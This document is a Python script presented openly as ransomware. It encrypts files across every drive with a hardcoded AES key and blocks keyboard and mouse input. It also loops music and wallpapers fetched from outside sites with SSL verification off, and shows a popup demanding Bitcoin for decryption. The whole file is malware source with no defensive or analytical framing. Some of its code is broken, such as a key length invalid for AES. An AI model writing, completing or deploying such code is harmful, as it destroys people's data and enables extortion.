import os
import ctypes
import time
import pygame
import pyautogui
import requests
from PIL import Image
from io import BytesIO
from threading import Thread
from tkinter import messagebox
from Crypto.Cipher import AES
import tkinter as tk

# Set a fixed encryption key
encryption_key = b'key:password12345678'  # Must be 16 bytes for AES-128

# Slow down the mouse pointer by multiplying movements by a factor
def slow_down_mouse():
    while True:
        x, y = pyautogui.position()
        pyautogui.moveTo(x / 5, y / 5)  # Adjust factor for better usability
        time.sleep(0.1)

# Disable critical system functionalities (Ctrl+Alt+Del, Task Manager, etc.)
def block_system_functions():
    try:
        ctypes.windll.user32.BlockInput(True)  # Blocks all keyboard and mouse input
    except Exception as e:
        print(f"Error blocking input: {e}")

# Function to get all drives (for Windows)
def get_drives():
    drives = []
    # Get the list of all available drives
    for drive in range(ord('A'), ord('Z') + 1):
        drive_letter = chr(drive) + ":\\" 
        if os.path.exists(drive_letter):
            drives.append(drive_letter)
    # Start with the Desktop and then add other drives
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    drives = [desktop] + [d for d in drives if d != "C:\\"] + ["C:\\"]
    return drives

# Function to download files from a URL
def download_file(url, save_path):
    try:
        response = requests.get(url, verify=False, timeout=10)  # Disable SSL verification
        response.raise_for_status()  # Raise an error for bad status
        with open(save_path, 'wb') as file:
            file.write(response.content)
    except Exception as e:
        print(f"Error downloading file from {url}: {e}")

# List of critical system files to exempt from encryption
EXEMPT_FILES = [
    "C:\\Windows",
    "C:\\Windows\\System32\\explorer.exe",
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Windows\\System32\\taskmgr.exe",
    "C:\\Windows\\System32\\shutdown.exe",  # Prevent shutdown command
]

def is_exempt(file_path):
    return (file_path.lower().startswith("c:\\windows\\") or
            file_path.lower() in (f.lower() for f in EXEMPT_FILES))

def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            file_data = f.read()

        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(file_data)

        with open(file_path, 'wb') as f:
            f.write(cipher.nonce)  # Write nonce
            f.write(tag)           # Write authentication tag
            f.write(ciphertext)    # Write encrypted file data
        print(f"Encrypted {file_path}")  # Debugging output
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")

# Recursively encrypt files in all directories
def encrypt_all_files(drives, key):
    print("Starting encryption process...")
    for drive in drives:
        for root, dirs, files in os.walk(drive):
            for file in files:
                file_path = os.path.join(root, file)
                if not is_exempt(file_path):  # Check if file is exempt
                    encrypt_file(file_path, key)
                    print(f"Encrypted {file_path}")
    print("Encryption process completed.")
    show_ransom_popup()  # Show the ransom popup after encryption


# Function to decrypt a single file
def decrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            nonce = f.read(16)  # Read nonce
            tag = f.read(16)    # Read authentication tag
            ciphertext = f.read()  # Read encrypted data

        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
        file_data = cipher.decrypt_and_verify(ciphertext, tag)

        with open(file_path, 'wb') as f:
            f.write(file_data)
        print(f"Decrypted {file_path}")  # Debugging output
    except Exception as e:
        print(f"Error decrypting {file_path}: {e}")

# Function to decrypt all files in all drives
def decrypt_all_files(drives, key):
    for drive in drives:
        for root, dirs, files in os.walk(drive):
            for file in files:
                file_path = os.path.join(root, file)
                decrypt_file(file_path, key)
                print(f"Decrypted {file_path}")

# Function to handle decryption after entering the correct key
def handle_decryption(input_key):
    try:
        input_key_bytes = bytes.fromhex(input_key)

        if input_key_bytes == encryption_key:
            decrypt_all_files(drives, input_key_bytes)
            messagebox.showinfo("Success", "Files decrypted successfully!")
            root.destroy()  # Close the popup
        else:
            messagebox.showerror("Error", "Incorrect decryption key!")
    except Exception as e:
        messagebox.showerror("Error", f"Decryption failed: {e}")

# Play music
def play_music(music_urls):
    pygame.mixer.init()
    while True:
        for url in music_urls:
            song_path = "temp_song.mp3"
            download_file(url, song_path)
            pygame.mixer.music.load(song_path)
            pygame.mixer.music.play(-1)  # Loop the song
            while pygame.mixer.music.get_busy():
                pygame.mixer.music.set_volume(1.0)
                time.sleep(1)

# Main function to start the encryption and ransom process
def start_ransomware():
    global drives
    drives = get_drives()
    encrypt_all_files(drives, encryption_key)

def change_wallpapers(wallpaper_urls):
    while True:
        for url in wallpaper_urls:
            try:
                response = requests.get(url, verify=False, timeout=10)  # Disable SSL verification
                img = Image.open(BytesIO(response.content))
                img.save("temp_wallpaper.bmp")  # Save the image temporarily as BMP
                ctypes.windll.user32.SystemParametersInfoW(20, 0, "temp_wallpaper.bmp", 0)
                time.sleep(30)  # Wait for 30 seconds before changing the wallpaper
            except Exception as e:
                print(f"Error changing wallpaper: {e}")

def show_ransom_popup():
    global root
    root = tk.Tk()
    root.title("Your files have been encrypted!")
    
    message = "All your files have been encrypted!\n\nPay $100 in Bitcoin to get the decryption key.\n\nContact: hacker@example.com"
    label = tk.Label(root, text=message, padx=20, pady=20)
    label.pack()

    ok_button = tk.Button(root, text="OK", command=root.quit)
    ok_button.pack(pady=10)

    root_width = 400
    root_height = 200
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x = (screen_width // 2) - (root_width // 2)
    y = (screen_height // 2) - (root_height // 2)

    root.geometry(f"{root_width}x{root_height}+{x}+{y}")
    root.mainloop()

# URLs for wallpapers and songs
wallpaper_urls = [
    "https://images.filmibeat.com/webp/ph-big/2023/06/mahesh-babu_168654620560.jpg",
    "https://images.filmibeat.com/webp/ph-big/2023/04/mahesh-babu_168075943930.jpg",
    "https://images.filmibeat.com/webp/ph-big/2023/04/mahesh-babu_168075943920.jpg",
    "https://images.filmibeat.com/webp/ph-big/2023/04/mahesh-babu_168075943910.jpg",
    "https://images.filmibeat.com/webp/ph-big/2023/04/mahesh-babu_168075943800.jpg",
    "https://images.filmibeat.com/webp/ph-big/2022/05/mahesh-babu_165224588730.jpg",
    "https://images.filmibeat.com/webp/ph-big/2019/04/mahesh-babu_1556097763140.jpg",
    "https://images.filmibeat.com/webp/ph-big/2019/04/mahesh-babu_1556097763130.jpg",
    "https://images.filmibeat.com/webp/ph-big/2019/04/mahesh-babu_155609776380.jpg",
    "https://images.filmibeat.com/webp/ph-big/2019/04/mahesh-babu_155609776330.jpg",
    "https://c4.wallpaperflare.com/wallpaper/226/472/1001/srimanthudu-mahesh-babu-wallpaper-thumb.jpg",
    "https://c4.wallpaperflare.com/wallpaper/1010/643/760/mahesh-babu-shruti-haasan-wallpaper-thumb.jpg",
    "https://c4.wallpaperflare.com/wallpaper/981/662/373/shruti-haasan-mahesh-babu-srimanthudu-wallpaper-preview.jpg",
    "https://c4.wallpaperflare.com/wallpaper/591/679/648/movies-bollywood-movies-wallpaper-thumb.jpg"
]

# URLs for music
music_urls = [
        "https://sencloud.online/mp3/Telugu%20Mp3/All/Bussinessman%282012%29/Mumbai-SenSongsMp3.Co.mp3",
        "https://mp3teluguwap.net/mp3/Spyder%20(2017)/Achcham%20Telugandham-SenSongsMp3.Co.mp3",
        "https://mp3teluguwap.net/mp3/2024/Guntur%20Karam/Guntur%20Karam/Dum%20Masala.mp3",
        "https://mp3teluguwap.net/mp3/2024/Guntur%20Karam/Guntur%20Karam%20-%20HQ/Kurchi%20Madathapetti.mp3",
        "https://mp3teluguwap.net/mp3/Spyder%20(2017)/Ciciliya%20Ciciliya-SenSongsMp3.Co.mp3",
        "https://mp3teluguwap.net/mp3/2019/Maharshi%20-%20(2019)/Maharshi%20(2019)%20-%20HQ/Everest%20Anchuna%20-%20SenSongsMp3.Co.mp3",
        "https://sencloud.online/mp3/Telugu%20Mp3/All/Bussinessman%282012%29/Bad%20Boys-SenSongsMp3.Co.mp3",
        "https://sencloud.online/mp3/Telugu%20Mp3/All/Bussinessman%282012%29/Pilla%20Chao-SenSongsMp3.Co.mp3",
        "https://mp3teluguwap.net/mp3/111/Bussinessman/Rage%20Of%20Surya.mp3",
        "https://mp3teluguwap.net/mp3/2018/Bharat%20Ane%20Nenu%20(2018)/Bharat%20Ane%20Nenu%20-%20HQ/Bharat%20Ane%20Nenu%20-%20SenSongsMp3.Co.mp3",
        "https://mp3teluguwap.net/mp3/2018/Bharat%20Ane%20Nenu%20(2018)/Bharat%20Ane%20Nenu%20-%20HQ/Vachaadayyo%20Saami%20-%20SenSongsMp3.Co.mp3",
        "https://mp3teluguwap.net/mp3/2018/Bharat%20Ane%20Nenu%20(2018)/Bharat%20Ane%20Nenu%20-%20HQ/O%20Vasumathi%20-%20SenSongsMp3.Co.mp3",
        "https://sencloud.online/mp3/Telugu%20Mp3/All/Khaleja%282010%29/Taxi-SenSongsMp3.Co.mp3",
        "https://sencloud.online/mp3/Telugu%20Mp3/All/Khaleja%282010%29/Sada%20Siva-SenSongsMp3.Co.mp3",
        # Add more URLs here...
    ]
if __name__ == "__main__":
    # Start blocking system functions and slow down mouse in separate threads
    Thread(target=block_system_functions, daemon=True).start()
    Thread(target=slow_down_mouse, daemon=True).start()
    Thread(target=start_ransomware, daemon=True).start()
    Thread(target=play_music, args=(music_urls,), daemon=True).start()
    Thread(target=change_wallpapers, args=(wallpaper_urls,), daemon=True).start()

